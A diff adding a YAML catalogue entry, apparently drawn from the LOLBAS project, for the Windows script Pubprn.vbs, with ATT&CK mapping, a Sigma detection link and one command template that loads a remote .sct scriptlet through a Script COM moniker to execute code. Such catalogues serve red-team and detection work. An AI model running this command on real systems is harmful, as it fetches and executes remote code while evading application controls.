@@ -1,0 +1,29 @@
+id: lolbas/pubprn/execute/0
+type: script
+platform: windows
+name: Pubprn.vbs
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0 (verify upstream LICENSE)
+  upstream_version: 9c5e384
+  last_synced: '2026-08-25'
+attack_techniques:
+- T1216.001
+opsec:
+  noise: high
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml
+commands:
+- template: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
+  comment: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
+references:
+- https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
+tags:
+- windows
+- lolbas
